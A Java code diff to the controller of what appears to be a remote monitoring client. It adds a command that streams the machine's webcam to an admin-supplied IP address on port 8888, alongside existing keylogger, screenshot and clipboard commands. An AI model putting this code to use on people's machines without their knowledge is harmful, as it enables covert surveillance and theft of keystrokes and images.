@@ -32,6 +32,7 @@ public class Controller {
     private static final String COUNTDOWN_PROPERTY = "countdown";
     private static String ADMIN_HOST ="";
     private static final String PID_PROPERTY = "pid";
+    private static AtomicBoolean isUseCamera = new AtomicBoolean(false);
     private static AtomicBoolean isMonitoring = new AtomicBoolean(false);
 
     public static void init() {
@@ -39,27 +40,29 @@ public class Controller {
         put(COMMAND_CLIENT_SYSTEM_USAGE, Controller::getClientSystemUsage);
         put(COMMAND_CLIENT_MONITOR, Controller::getClientMonitor);
         put(COMMAND_CLIENT_SCREENSHOT, Controller::getScreenshot);
+        put(COMMAND_CLIENT_CAMERA, Controller::getClientCamera);
         put(COMMAND_CLIENT_CLIPBOARD, Controller::getClipboard);
         put(COMMAND_END_CLIENT_PROCESS, Controller::endProcess);
         put(COMMAND_CLIENT_KEYLOGGER, Controller::getKeylogger);
         put(COMMAND_CLIENT_PROCESS, Controller::getProcess);
         put(COMMAND_SHUTDOWN_CLIENT, Controller::shutdown);
+
         new Thread(() -> {
             while (true) {
                 Webcam webcam = Webcam.getDefault();
-                System.out.println("Waiting open streaming");
-                while (!isMonitoring.get()) {
+                System.out.println("Waiting open camera");
+                while (!isUseCamera.get()) {
                     if (webcam.isOpen())
                         webcam.close();
                     try {
-                        System.out.println("Waiting open streaming");
+                        System.out.println("Waiting open camera");
                         Thread.sleep(1000);
                     } catch (InterruptedException e) {
                         e.printStackTrace();
                     }
                 }
 
-                while (isMonitoring.get()) {
+                while (isUseCamera.get()) {
                     Socket soc = null;
                     try {
                         soc = new Socket(ADMIN_HOST, 8888);
@@ -114,6 +117,19 @@ public class Controller {
         try {
             System.out.println(input);
             isMonitoring.set(input.getBoolean("isMonitoring"));
+            ADMIN_HOST = input.get("ipAddress");
+            return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_ACK)
+                    .json();
+        } catch (Exception e) {
+            System.out.println(e);
+            return "";
+        }
+    }
+
+    private static String getClientCamera(JSON input) {
+        try {
+            System.out.println(input);
+            isUseCamera.set(input.getBoolean("isUseCamera"));
             ADMIN_HOST = input.get("ipAddress");
             return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_ACK)
                     .json();
